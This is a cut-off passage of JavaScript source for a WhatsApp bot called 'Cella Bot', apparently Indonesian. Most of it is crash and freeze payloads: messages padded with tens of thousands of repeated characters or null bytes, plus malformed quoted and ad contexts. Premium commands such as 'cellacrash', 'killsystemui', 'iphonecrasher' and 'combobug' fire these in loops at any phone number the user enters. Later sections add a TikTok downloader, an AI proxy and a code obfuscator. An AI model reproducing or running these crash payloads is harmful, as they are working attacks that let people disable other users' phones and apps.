	async function IosPayM(zLoc, ptcp = false) {
			CellaBot.relayMessage(zLoc, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			});
			console.log(chalk.green("Cella Bot | Bug Sent "));
		};
		
				async function IosStanza(zLoc, ptcp = false) {
			CellaBot.relayMessage(zLoc, {
				'extendedTextMessage': {
					'text': 'CellaBugs' + 'ꦾ'.repeat(35000),
					'contextInfo': {
						'stanzaId': zLoc,
						'participant': zLoc,
						'quotedMessage': {
							'conversation': '🌷 Cella Here' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Attacking | Bug Sent 😈"));
		};
		
				async function IosCL(zLoc, ptcp = false) {
			await CellaBot.relayMessage(zLoc, {
					"extendedTextMessage": {
						"text": " Hello This Is cella ",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": zLoc,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Hello ",
								"body": " 🌷 Cella Is Here ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": " p ",
								"mediaUrl": " p ",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": " p "
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc,
					}
				} : {}
			);
			console.log(chalk.green("Cella Bot Attacked Someone!"));
		};
		
// Blank Speciality //
async function BlankInvite(LockJids, ptcp = false) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "zCella" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await CellaBot.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
// Case Bug ! //
case 'cellacrash': 

     if (!isPrem) return m.reply(` Khusus Premium `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
case 'byypas': 

     if (!isPrem) return m.reply(` Khusus Premium `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: NewBug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await CallMsg(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: NewBug
 `)
 break
 case 'clearbugs': {
 
if (!isPrem) return m.reply(" Khusus Premium ")
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
CellaBot.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break 
 case 'cellafreeze': 
 
     if (!isPrem) return m.reply(` Khusus Premium `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
 case '🔥': 
 
     if (!isPrem) return m.reply(` Khusus Premium `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 🔥
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await CaroUsel(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: ❤️‍🔥
 `)
 break
 case 'hardbug': 
 
     if (!isPrem) return m.reply(` Khusus Premium `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: hardbug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await XeonXRobust(zLoc, ptcp = true)
    await xeonHARD(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await newsLetter(zLoc, ptcp = true)   
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: hardbug
 `)
 break
 case '😈': 
 
     if (!isPrem) return m.reply(` Khusus Premium `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 😈
© Cella 
 `)
     for (let i = 0; i < 10; i++) {
    await Gsz(zLoc, Ptcp = true)
    await xPokers(zLoc, Ptcp = true)
    await uidoc2(zLoc, ptcp = false)
    await freezefile(zLoc, ptcp = false)
    await CaroUsel(zLoc, ptcp = false)
    await NullX(zLoc, ptcp = false)
    await Vulcanicx(zLoc, ptcp = false)
    await xTravas(zLoc, ptcp = false)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 😈
 `)
 break
case '🦅': 

     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: 🦅
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 🦅
 `)
 case 'killsystemui':
 
     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
 case 'blankwhatsapp': 
 
     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
case 'mediumbug':
 
if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: mediumbug
 `)
     for (let i = 0; i < 5; i++) {
    await SletterCrash(zLoc, ptcp = true)
    await freezefile(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: mediumbug
 `)
 break
case 'combobug':

     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Bug Combo 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await TanggapanDiterima(zLoc, ptcp = true)
    await VPen(zLoc, ptcp = true)
    await BlankInvite(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Bug Combo
 `)
 break
 case 'iphonecrasher': 
 
 if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'lockios':
 
if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'killaccess': 
 
if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Kill iPhone Access
 `)
     for (let i = 0; i < 5; i++) {
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Kill iPhone Access
 `)
 break
 case 'locationbug': 
 
     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Location Bug
 `)
     for (let i = 0; i < 9; i++) {
    await liveLokFreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Location Bug
 `)
 break
 case 'documentbug': 
 
     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Document Bug
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Document Bug
 `)
 break
case 'pairing': 
 
     if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return m.reply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: pairing
 `)
     for (let i = 0; i < 9; i++) {
    await SendPairing(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: pairing
 `)
 break
// Encrypt & Decrypt Dll. //
case 'ai': {
  if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break
case "tourl": {

if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
anggazyy.sendMessage(from, {
react: {
text: '🎁',
key: m.key
}
});
let media = await q.download()
let uploadImage = require('./serverside/libary/catmoe')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
m.reply(`Your Link : ${link}\nExpired Date : Undefined`)
}
 break
case 'tt': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)
    
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
async function tiktokDl2(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res && !res.size && !res.wm_size && !res.hd_size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				if (res && res.wmplay) {
					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
				}
				if (res && res.play) {
					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
				}
				if (res && res.hdplay) {
					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
				}
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
let down = await tiktokDl2(text)
let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
Judul: ${down.title}
Server: ${down.region}
ID: ${down.id}
Durasi: ${down.duration}
Size: ${down.size_nowm_hd}

Music Info:
ID: ${down.music_info.id}
Judul: ${down.music_info.title}
Pemilik Musik: ${down.music_info.author}

Stats: 
Views: ${down.stats.views}
Likes: ${down.stats.likes}
Comment: ${down.stats.comment}
Share: ${down.stats.share}
Download: ${down.stats.download}

Author: 
ID: ${down.author.id}
Full Name: ${down.author.fullname}
Nickname: ${down.author.nickname}
Avatar: ${down.author.avatar}
`
await CellaBot.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m })
await CellaBot.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
case 'encrypt': {

if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await CellaBot.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break
case "sad1":
 case "sad2":
 case "sad3":
 case "sad4":
 case "sad5":
 case "sad6":
 case "sad7":
 case "sad8":
 case "sad9":
 case "sad10":
 case "sad11":
 case "sad12":
 case "sad13":
 case "sad14":
 case "sad15":
 case "sad16":
 case "sad17":
 case "sad18":
 case "sad19":
 case "sad20":
 case "sad21":
 case "sad22":
 case "sad23":
 case "sad24":
 case "sad25":
 case "sad26":
 case "sad27":
 case "sad28":
 case "sad29":
 case "sad30":
 case "sad31":
 case "sad32":
 case "sad33":
 case "sad34":
 case "sad35":
const moai0 = await getBuffer(
`https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
 );
CellaBot.sendMessage(
m.chat,
 {
audio: moai0,
mimetype: "audio/mp4",
ptt: true,
 },
{ quoted: m }
 );
break
case 'encrypthard': {

if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難Cella素晴座素晴難" + 
            "素晴座素晴難Cella素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
